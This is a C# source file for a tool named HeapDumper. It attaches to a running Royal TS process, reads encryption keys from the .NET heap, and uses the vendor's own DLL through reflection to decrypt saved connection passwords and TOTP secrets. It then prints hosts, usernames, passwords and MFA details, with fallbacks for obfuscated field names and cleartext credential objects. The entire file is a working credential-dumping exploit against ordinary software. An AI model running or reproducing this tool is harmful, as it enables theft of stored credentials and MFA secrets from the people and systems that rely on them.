using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Diagnostics.Runtime;

class Program
{
    static Dictionary<string, string> ReadKvStore(ClrObject obj)
    {
        var kv = new Dictionary<string, string>();
        try {
            var kvStore = obj.ReadObjectField("_keyValueStore");
            if (!kvStore.IsValid || kvStore.Type == null) return kv;
            var entries = kvStore.ReadObjectField("_entries");
            if (!entries.IsValid || entries.Type == null || !entries.Type.IsArray) return kv;
            var arr = entries.AsArray();
            for (int i = 0; i < arr.Length; i++)
            {
                try {
                    var sv = arr.GetStructValue(i);
                    var ko = sv.ReadObjectField("key");
                    var vo = sv.ReadObjectField("value");
                    if (ko.IsValid && ko.AsString() != null)
                        kv[ko.AsString()!] = vo.IsValid ? (vo.AsString() ?? "") : "";
                } catch {}
            }
        } catch {}
        return kv;
    }

    static void Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("Usage: HeapDumper <PID> <RoyalTSInstallDir>"); return; }
        int pid = int.Parse(args[0]);
        string rtDir = args[1];

        Console.WriteLine($"[*] Attaching to PID {pid}...");
        using var target = DataTarget.AttachToProcess(pid, false);

        foreach (var clrInfo in target.ClrVersions)
        {
            Console.WriteLine($"[*] CLR {clrInfo.Version}");
            ClrRuntime runtime;
            try {
                runtime = clrInfo.CreateRuntime();
            } catch {
                // Fallback for air-gapped systems: find DAC locally instead of symbol server
                var clrPath = clrInfo.ModuleInfo.FileName;
                if (!string.IsNullOrEmpty(clrPath)) {
                    var dacPath = Path.Combine(Path.GetDirectoryName(clrPath)!, "mscordaccore.dll");
                    Console.WriteLine($"[*] Symbol server failed, using local DAC: {dacPath}");
                    runtime = clrInfo.CreateRuntime(dacPath);
                } else {
                    throw;
                }
            }
            var heap = runtime.Heap;
            Console.WriteLine($"[*] Scanning heap...");

            var allKeysets = new List<(string key1, string key2, string doc)>();
            var docPwdCandidates = new List<string> { "" };
            var credentialInfos = new List<ClrObject>();

            // Helper to extract keys from a SecurityInterface object
            void ExtractSiKeys(ClrObject si)
            {
                string k1 = "", k2 = "", doc = "";
                try { k1 = si.ReadStringField("smhos") ?? ""; } catch {}
                try { k2 = si.ReadStringField("smhot") ?? ""; } catch {}
                try { doc = si.ReadStringField("smhou") ?? ""; } catch {}

                if (string.IsNullOrEmpty(k1))
                {
                    var strFields = new List<(string name, string val)>();
                    foreach (var f in si.Type.Fields)
                    {
                        if (f.ElementType != ClrElementType.String) continue;
                        try { var v = si.ReadStringField(f.Name); if (!string.IsNullOrEmpty(v)) strFields.Add((f.Name, v)); } catch {}
                    }
                    var keys = strFields.Where(x => x.val.Length == 50).ToList();
                    var docF = strFields.FirstOrDefault(x => x.val.EndsWith(".rtsz") || x.val.EndsWith(".rtsx") || x.val == "Application");
                    if (keys.Count >= 2)
                    {
                        k1 = keys[0].val; k2 = keys[1].val; doc = docF.val ?? "";
                        Console.WriteLine($"[*] Keys by pattern: {keys[0].name}/{keys[1].name}, doc={doc}");
                    }
                }
                if (!string.IsNullOrEmpty(k1) && !allKeysets.Any(ks => ks.key1 == k1))
                    allKeysets.Add((k1, k2, doc));
            }

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn1 = obj.Type.Name ?? "";

                if (tn1.Contains("RoyalSecurityInterface"))
                {
                    ExtractSiKeys(obj);
                    continue;
                }

                if (tn1 == "RoyalDocumentLibrary.RoyalStore")
                {
                    try { var si = obj.ReadObjectField("<SecurityInterface>k__BackingField"); if (si.IsValid && si.Type != null) ExtractSiKeys(si); } catch {}
                    try { var si = obj.ReadObjectField("<SecurityInterfaceLegacy>k__BackingField"); if (si.IsValid && si.Type != null) ExtractSiKeys(si); } catch {}
                    continue;
                }

                if (tn1 == "RoyalDocumentLibrary.CredentialInfo")
                {
                    credentialInfos.Add(obj);
                    continue;
                }

                if (tn1 == "Zxcvbn.Result")
                {
                    foreach (var f in obj.Type.Fields)
                    {
                        try {
                            if (f.ElementType == ClrElementType.String)
                            {
                                var fn = (f.Name ?? "").TrimStart('_', '<').Replace(">k__BackingField", "").ToLowerInvariant();
                                if (fn.Contains("password"))
                                {
                                    var val = obj.ReadStringField(f.Name);
                                    if (!string.IsNullOrEmpty(val) && val.Length >= 1 && val.Length <= 100 && !docPwdCandidates.Contains(val))
                                        docPwdCandidates.Add(val);
                                }
                            }
                        } catch {}
                    }
                    continue;
                }
            }

            Console.WriteLine($"[*] Found {allKeysets.Count} SecurityInterface keyset(s)");
            foreach (var ks in allKeysets)
                Console.WriteLine($"[*]   doc={ks.doc}, key1={ks.key1.Length}c, key2={ks.key2.Length}c");

            string siKey1 = allKeysets.Count > 0 ? allKeysets[0].key1 : "";
            string siKey2 = allKeysets.Count > 0 ? allKeysets[0].key2 : "";
            string siDoc = allKeysets.Count > 0 ? allKeysets[0].doc : "";

            // CredentialInfo fallback when no keys found
            if (allKeysets.Count == 0 && credentialInfos.Count > 0)
            {
                Console.WriteLine($"[*] No encryption keys, checking {credentialInfos.Count} CredentialInfo for cleartext...");
                Console.WriteLine("\n##RESULTS_START##");
                foreach (var ci in credentialInfos)
                {
                    try {
                        string user = "", pwd = "";
                        try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
                        try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
                        if (!string.IsNullOrEmpty(pwd))
                            Console.WriteLine($"TYPE:CredentialInfo|NAME:|HOST:|USER:{user}|TOTP:|OTPALGO:|OTPDIGITS:|OTPPERIOD:|OTPLABEL:|PASS:{pwd}");
                    } catch {}
                }
                Console.WriteLine("##RESULTS_END##");
                return;
            }

            if (string.IsNullOrEmpty(siKey1))
            {
                Console.WriteLine("[!] No SecurityInterface keys found on heap");
                Console.WriteLine("[*] Dumping Royal/Security types on heap for diagnostics...");
                var diagTypes = new HashSet<string>();
                foreach (var obj in heap.EnumerateObjects())
                {
                    if (!obj.IsValid || obj.Type == null) continue;
                    var tn = obj.Type.Name ?? "";
                    if ((tn.Contains("Royal") || tn.Contains("Security") || tn.Contains("Credential")) && !tn.EndsWith("[]") && diagTypes.Add(tn))
                    {
                        var fields = string.Join(", ", obj.Type.Fields.Select(f => f.Name ?? "?"));
                        Console.WriteLine($"    [{tn}] fields: {fields}");
                    }
                }
                if (diagTypes.Count == 0)
                    Console.WriteLine("    (none found - is a document open?)");
                Console.WriteLine("\n##RESULTS_START##\n##RESULTS_END##");
                return;
            }
            Console.WriteLine($"[*] SecurityInterface keys extracted (key1={siKey1.Length}c, key2={siKey2.Length}c, doc={siDoc})");
            Console.WriteLine($"[*] Found {docPwdCandidates.Count} document password candidate(s)");

            var entries = new List<(string type, string name, string host, string user, string encPwd, string encTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel, string docName)>();

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn = obj.Type.Name ?? "";
                if (!tn.StartsWith("RoyalDocumentLibrary.Royal")) continue;
                if (!(tn.Contains("Credential") || tn.Contains("Connection")) || tn.EndsWith("[]")) continue;

                var kv = ReadKvStore(obj);
                string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
                if (string.IsNullOrEmpty(encPwd)) continue;

                string name = "", host = "", user = "";
                kv.TryGetValue("Name", out name); name ??= "";
                kv.TryGetValue("UserName", out user); user ??= "";
                if (string.IsNullOrEmpty(user)) { kv.TryGetValue("CredentialUsername", out user); user ??= ""; }
                kv.TryGetValue("ComputerName", out host); host ??= "";
                if (string.IsNullOrEmpty(host)) { kv.TryGetValue("URI", out host); host ??= ""; }

                string encTotp = ""; kv.TryGetValue("MfaTotpSecret", out encTotp); encTotp ??= "";
                string mfaCfg = ""; kv.TryGetValue("MfaConfiguration", out mfaCfg); mfaCfg ??= "0";
                string otpAlgo = "", otpDigits = "", otpPeriod = "", otpLabel = "";
                if (mfaCfg != "0" && mfaCfg != "") {
                    string raw = ""; kv.TryGetValue("MfaTotpGeneratorAlgorithm", out raw); raw ??= "0";
                    otpAlgo = raw switch { "0" => "SHA1", "1" => "SHA256", "2" => "SHA512", _ => raw };
                    kv.TryGetValue("MfaTotpGeneratorCodeLength", out otpDigits); otpDigits ??= "0";
                    if (otpDigits == "0") otpDigits = "6";
                    kv.TryGetValue("MfaTotpGeneratorSecondsValid", out otpPeriod); otpPeriod ??= "30";
                    kv.TryGetValue("MfaTotpGeneratorLabel", out otpLabel); otpLabel ??= "";
                }

                string docName = "";
                try {
                    var doc = obj.ReadObjectField("_royalDocument");
                    if (doc.IsValid && doc.Type != null) {
                        var dkv = ReadKvStore(doc);
                        dkv.TryGetValue("Name", out docName); docName ??= "";
                    }
                } catch {}

                entries.Add((tn.Replace("RoyalDocumentLibrary.", ""), name, host, user, encPwd, encTotp, otpAlgo, otpDigits, otpPeriod, otpLabel, docName));
            }

            var unique = entries.GroupBy(e => $"{e.name}|{e.user}").Select(g => g.First()).ToList();
            Console.WriteLine($"[*] Found {unique.Count} entry(ies) with encrypted passwords");

            AppDomain.CurrentDomain.AssemblyResolve += (s, e) => {
                var p = Path.Combine(rtDir, new AssemblyName(e.Name).Name + ".dll");
                return File.Exists(p) ? Assembly.LoadFrom(p) : null;
            };

            object? siInst = null;
            MethodInfo? decMethod = null;
            FieldInfo? fKey1 = null, fKey2 = null, fDoc = null;
            try {
                var siAsm = Assembly.LoadFrom(Path.Combine(rtDir, "RoyalDocument.SecurityInterface.dll"));
                var siType = siAsm.GetType("RoyalDocumentLibrary.RoyalSecurityInterface")!;
                siInst = Activator.CreateInstance(siType);
                var bf = BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance;

                fKey1 = siType.GetField("smhos", bf);
                fKey2 = siType.GetField("smhot", bf);
                fDoc = siType.GetField("smhou", bf);

                // Fallback: find string fields by pattern (obfuscated names in V6)
                if (fKey1 == null || fKey2 == null)
                {
                    var strFields = siType.GetFields(bf).Where(f => f.FieldType == typeof(string)).ToList();
                    Console.WriteLine($"[*] DLL string fields: {string.Join(", ", strFields.Select(f => f.Name))}");
                    // Set all string fields to empty first, then fill key1/key2/doc
                    // Key fields are the first two string fields, doc is the third
                    if (strFields.Count >= 3)
                    {
                        fKey1 = strFields[0];
                        fKey2 = strFields[1];
                        fDoc = strFields[2];
                        Console.WriteLine($"[*] Using DLL fields: key1={fKey1.Name}, key2={fKey2.Name}, doc={fDoc.Name}");
                    }
                }

                fKey1?.SetValue(siInst, siKey1);
                fKey2?.SetValue(siInst, siKey2);
                fDoc?.SetValue(siInst, siDoc);

                decMethod = siType.GetMethod("Decrypt", new[] { typeof(string), typeof(bool), typeof(string) });
                // Fallback: find any method with matching signature
                if (decMethod == null)
                {
                    foreach (var m in siType.GetMethods(bf))
                    {
                        var pars = m.GetParameters();
                        if (pars.Length == 3 && pars[0].ParameterType == typeof(string) && pars[1].ParameterType == typeof(bool) && pars[2].ParameterType == typeof(string) && m.ReturnType == typeof(string))
                        {
                            decMethod = m;
                            Console.WriteLine($"[*] Decrypt method found as: {m.Name}");
                            break;
                        }
                    }
                }
                Console.WriteLine("[*] SecurityInterface loaded, decrypting...");
            } catch (Exception ex) {
                Console.WriteLine($"[!] Failed to load SecurityInterface: {ex.Message}");
            }

            foreach (var x in unique) {
                if (!string.IsNullOrEmpty(x.name) && !docPwdCandidates.Contains(x.name)) docPwdCandidates.Add(x.name);
                if (!string.IsNullOrEmpty(x.user) && !docPwdCandidates.Contains(x.user)) docPwdCandidates.Add(x.user);
                if (!string.IsNullOrEmpty(x.docName) && !docPwdCandidates.Contains(x.docName)) docPwdCandidates.Add(x.docName);
            }

            Console.WriteLine($"[*] Document password candidates: {docPwdCandidates.Count} (including empty)");

            // Try decryption with ALL keysets
            Console.WriteLine("\n##RESULTS_START##");
            int decrypted = 0;

            foreach (var e in unique)
            {
                string plainPwd = "", plainTotp = "", usedDp = "";

                // Try each keyset
                foreach (var ks in allKeysets)
                {
                    if (!string.IsNullOrEmpty(plainPwd)) break;

                    // Load keys into DLL instance
                    if (siInst != null && fKey1 != null && fKey2 != null && fDoc != null)
                    {
                        fKey1.SetValue(siInst, ks.key1);
                        fKey2.SetValue(siInst, ks.key2);
                        fDoc.SetValue(siInst, ks.doc);
                    }

                    if (decMethod != null && siInst != null)
                    {
                        foreach (var dp in docPwdCandidates)
                        {
                            try {
                                plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, dp }) ?? "");
                                if (!string.IsNullOrEmpty(plainPwd)) { usedDp = dp; break; }
                            } catch {}
                        }
                    }
                }

                if (!string.IsNullOrEmpty(plainPwd))
                {
                    decrypted++;
                    if (!string.IsNullOrEmpty(e.encTotp) && decMethod != null && siInst != null)
                    {
                        try { plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? ""); } catch {}
                    }
                }
                Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{e.host}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
            }

            // If nothing decrypted, try CredentialInfo objects as fallback
            if (decrypted == 0 && credentialInfos.Count > 0)
            {
                Console.WriteLine($"## CREDINFO_START (fallback: {credentialInfos.Count} resolved credentials) ##");
                foreach (var ci in credentialInfos)
                {
                    try {
                        string user = "", pwd = "", keyfile = "", passphrase = "";
                        try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
                        try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
                        try { keyfile = ci.ReadStringField("<Keyfile>k__BackingField") ?? ""; } catch {}
                        try { passphrase = ci.ReadStringField("<Passphrase>k__BackingField") ?? ""; } catch {}
                        if (!string.IsNullOrEmpty(user) || !string.IsNullOrEmpty(pwd))
                            Console.WriteLine($"CREDINFO|USER:{user}|PASS:{pwd}|KEYFILE:{keyfile}|PASSPHRASE:{passphrase}");
                    } catch {}
                }
            }

            Console.WriteLine("##RESULTS_END##");
        }
    }
}
